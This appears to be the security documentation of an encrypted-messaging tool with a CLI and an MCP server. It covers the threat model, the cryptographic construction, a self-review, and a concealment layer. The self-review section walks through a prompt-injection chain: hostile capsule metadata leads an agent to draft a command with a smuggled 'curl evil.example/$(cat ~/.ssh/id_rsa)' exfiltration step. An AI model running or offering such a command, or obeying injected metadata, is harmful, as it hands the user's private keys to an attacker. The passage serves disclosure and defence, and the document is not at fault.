# Security

What this tool protects, what it does not, and what review it has actually had.

## Threat model in one table

| Protected against | Not protected against |
|---|---|
| Anyone reading a message in transit or at rest — mail provider, chat platform, whoever holds the file | A compromised endpoint. If the machine sealing or opening is owned, so is the message. |
| Tampering. Any edit to ciphertext *or* visible header breaks both decryption and signature verification | Traffic analysis. Sender, recipient, timing and approximate size are visible by design. |
| Impersonation, *given* you verified the sender's fingerprint out of band | An unverified contact card. A card proves nothing on its own. |
| Offline cracking of a stolen vault (Argon2id, m=64MiB t=3) | Someone holding both your backup file and its passphrase — together they *are* your identity. |
| | **Replay.** A capsule reopens every time; there is no freshness check. Put a date or reference inside the payload if a message means "do this once". |
| | What you do next. Pasting plaintext elsewhere makes a copy the capsule cannot protect. |

## What is visible in every capsule

Sender's public signing key and fingerprint; recipient's encryption fingerprint; the sender's
claimed timestamp; all metadata including the subject; approximate message length.

**A capsule hides content, not the fact of correspondence.** If who-talks-to-whom is what you
need to protect, this is the wrong tool and no setting changes that.

## Construction

```
ephemeral X25519 keypair per capsule
  └─ shared secret with recipient's static X25519 public key
      └─ HKDF-SHA256, info = sender signing key ‖ recipient key ‖ ephemeral key
          └─ XChaCha20-Poly1305, associated data = the full visible header
              └─ Ed25519 signature over canonical(header) ‖ ciphertext
```

Established primitives only (`@noble/*`), no custom cryptography. Three properties worth naming:

- **Ephemeral sender keys.** Compromising a sender's long-term keys later does not decrypt past
  capsules, and identical messages produce different ciphertext.
- **The header is bound as associated data.** Editing visible metadata breaks decryption, not just
  the signature. Proven by a test that re-signs a forged header with a valid key and confirms the
  AEAD layer still rejects it — otherwise that second layer would be asserted rather than shown.
- **KDF parameters are bound too.** They are stored in cleartext so they can be raised later, but
  an attacker who can write the vault file cannot downgrade `m=65536` to `m=8` and brute-force
  cheaply.

### What a verified signature proves

That the holder of a specific private key sealed that exact capsule, and nothing changed since.
**Not** who that person is. Binding a key to a human happens out of band, by comparing
fingerprints directly. A contact card's checksum detects typos, not forgery.

## The CLI / MCP boundary

This is a security boundary, not a packaging choice.

| | MCP server | CLI |
|---|---|---|
| Inspect, verify, explain, manage public contacts | yes | yes |
| Passphrases | **never** | TTY only, echo suppressed, refuses a pipe |
| Decrypted plaintext | **never** | prints to the terminal only |
| Private keys | **never** | in memory for one operation |

A passphrase passed as an MCP tool argument travels through the model's context and lands in the
session transcript. So does a decrypted message returned from a tool. For a confidentiality tool
that is self-defeating, so there is no `seal_capsule` or `open_capsule` MCP tool and there will
not be. A test asserts the tool list against an explicit allowlist so the boundary cannot drift.

## Review, 2026-10-01

Self-review before first use. **Not an external audit.** No third party has looked at this.

### Found and fixed

**HIGH — prompt injection to shell command.** `inspect_capsule` rendered sender-chosen capsule
metadata and labels into the model's context as ordinary report rows, and
`draft_capsule_command` joined its arguments with spaces and no escaping. The chain was complete
and demonstrated end to end: a hostile capsule carrying instruction-shaped metadata → an agent
reading it → a drafted command containing `--out out.txt; curl evil.example/$(cat ~/.ssh/id_rsa)`
→ presented to the user under "Run this at a terminal". Fixed by rejecting paths with shell
metacharacters or `..` outright rather than escaping them, and by fencing sender-chosen text off
from verified fields, stripping control and bidi characters, and flagging injection-shaped
content. The first version of the fix echoed the rejected value back into context — caught by its
own regression test and fixed again.

**MEDIUM — `.gitignore` missed every filename the tool writes.** It covered `*.vault` and `*.key`
but not `identity.json`, `contacts.json`, or backups. Fixed, and backed by
`scripts/check-no-secrets.js`, which detects the artifact *formats* rather than trusting names.
Its first version used proximity regexes and a positive control immediately caught a real vault
renamed to `config-notes.json` sailing through; independent AND-ed conditions replaced it.

**LOW — unused constant-time comparison.** `equalBytes` was exported but never called, implying a
guarantee nothing relied on. Removed, with a note on why.

**LOW — replay undocumented.** The format has no freshness check. Now stated in
`explain_capsule_security` and the table above.

### Investigated and dismissed

- **Oversized-envelope DoS.** A 40 MB envelope is rejected in ~16 ms by the base64 gate before
  any parsing. Not a finding.
- **HKDF zero salt.** Well-defined, and the X25519 output is already high-entropy. Standard
  practice (HPKE does the same).
- **Fingerprint comparison not constant-time.** Fingerprints are public.

### Checks that run on every `npm test`

- `check:seam` — Apache-2.0 boundary of `capsule-core` (fails on package-name *and* relative imports)
- `check:licenses` — every package's LICENSE agrees with its manifest
- `check:secrets` — no vault, backup or capsule artifact anywhere in the tree
- 164 tests, including a whole-session sweep asserting no tool response ever contained a private
  key, passphrase, or plaintext canary — with a positive control proving the detector can fail

Every guard fails loudly if it inspected zero items. A check that covered nothing is not a pass.

## Still needs manual review

- **No external cryptographic audit.** The construction follows established patterns and uses
  established primitives, but one person wrote it and reviewed it.
- **Memory hygiene is best-effort.** `wipe()` zeroes buffers, but V8 may have copied them and Node
  offers no way to pin memory. Decrypted payloads are JavaScript strings and cannot be wiped at all.
- **`node:vm` in the transform bridge is not a sandbox.** It evaluates ~222 upstream files. The
  load path is never caller-controlled, but this is a trust-the-source arrangement, not isolation.
- **The injection-shape detector is heuristic.** It will miss novel phrasings. The structural
  fix — fencing untrusted text and rejecting unsafe paths — is what the design relies on; the
  detector is a convenience on top.

## Reporting a problem

Open an issue describing the behaviour. Do not include real capsules, contact cards, backups, or
anything from a live identity.

---

# Sealed notes (added 2026-10-01)

The shared-code mode, and the concealment layer on top of it.

## What it is and is not

| | Sealed note | Capsule |
|---|---|---|
| Key | one shared code | X25519 + Ed25519 keypairs |
| Setup | none | identity, contact cards, fingerprint verification |
| Proves authorship | **no** | yes |
| Conceals its own existence | yes, invisible carrier | no |

A shared code proves whoever sealed the note **knew the code** — nothing more. It cannot
distinguish the sender from anyone else who knows it, and there is no signature to add that would
mean anything. If authorship matters, use a capsule.

## Construction

```
Argon2id(code, salt)  m=64MiB t=3 p=1
  └─ XChaCha20-Poly1305, associated data = the full visible header
```

The header (version, timestamp, KDF parameters, salt, nonce) is bound as associated data, so
editing any of it breaks decryption rather than weakening it. Proven by test: a KDF downgrade from
`m=65536` to `m=16384` — above the hard floor, so only the binding catches it — fails to decrypt.

A wrong code and a tampered note produce the **identical** error message, asserted by test.
Distinguishing them would tell an attacker which of the two they achieved.

## The code is the whole scheme

Generated by default: 6 words plus a 4-digit number from a 506-word list, **67 bits measured
against the live wordlist** rather than asserted. Word-based because the code has to survive being
read down a phone line — that separation from the message is the only thing protecting it, and a
base64 blob gets mistyped and then pasted into the same chat window out of frustration.

The wordlist enforces a one-letter-difference rule rather than claiming it: no two published words
differ by a single letter, so one mis-hearing cannot silently produce a different valid word. A
first draft asserted that in a comment while containing **198 violating pairs**; the filter now
removes them and a test proves zero survive.

### Guessability is a separate gate from entropy

**Found in testing:** the character-class entropy model scored `password123` at 57 bits and
**accepted it**. Arithmetically defensible, operationally worthless — it is in every cracking
dictionary in existence. An entropy estimate measures how *long* a code is, not how *obvious*.

So patterns and known passwords are rejected *before* any arithmetic, and the refusal names the
reason. `correct-horse-battery-staple` is refused too: it is the most famous example password on
the internet. The list cannot be exhaustive and does not pretend to be; it catches the shapes
people reach for when asked to invent a password.

## Two defects found in this phase's own code

**`conceal` claimed encryption it had not verified.** It took a `payloadIsEncrypted` boolean that
**defaulted to true**, so a caller handing it plaintext got back "the payload was encrypted before
concealment". A safe-sounding default that lies is the worst kind. The flag is gone; the state is
now *detected* from the payload format, and anything unrecognised is reported as not encrypted.

**An invisible carrier with no cover text renders as a completely blank message** — conspicuous in
its own way, since an empty message invites a second look. Now warned about at conceal time.

## The envelope parser, and two wrong attempts at it

The old capsule envelope was destroyed by 4 of 5 realistic channel-damage modes. The sealed-note
parser survives all of them — newline stripping, full newline removal, quoted-printable soft
breaks, unicode dash substitution, markdown indentation, zero-width noise, trailing whitespace.
Getting there took two wrong versions, both caught by tests rather than review:

1. **"longest single base64url run"** returned one wrapped line out of five, because the body is
   emitted at 76 characters per line.
2. **"every run of 32+ characters, joined"** silently dropped the final line whenever the body
   length mod 76 fell below 32 — **roughly two messages in five**. A payload containing smart
   quotes happened to land there, which made it look like a character-encoding problem when it was
   arithmetic.

The shipped version collects every base64url character between the markers, having first removed
the one piece of furniture that could contaminate it (`id:` plus 16 hex). No length threshold
means no threshold to get wrong. A test sweeps payload lengths 1–120 so every residue is covered.

## Transcript exposure, scoped and enumerated

`conceal_message` and `reveal_message` return secrets in their responses **on purpose**: person A
cannot transmit a code they cannot see, and person B cannot read a message they only receive a
file path to. An earlier design returned a path and was useless for the job.

The exposure is therefore scoped to exactly two tools, stated in both tool descriptions and their
output, and **enumerated in the test suite**: the whole-session sweep allows those two fields on
those two tools and asserts a canary secret appears in no other tool's response. A deliberate
exception that is not written down is indistinguishable from a leak.

Private keys, vault passphrases and capsule plaintext remain absolutely forbidden in any response,
with no exceptions.

## Still true, still worth repeating

- **The code must travel a different route than the message.** Nothing in the software can enforce
  this, and it is the realistic failure mode rather than an exotic one.
- **Concealment is not invisibility to inspection.** `inspect_text` finds these carriers
  instantly. It defeats a skim, not an analyst.
- **No replay protection.** A note reopens every time; put a date inside the payload if that
  matters.
- **Self-review, not an external audit** — and this phase's review found two real defects in code
  written the same day, which is the argument for an outside pass rather than against it.
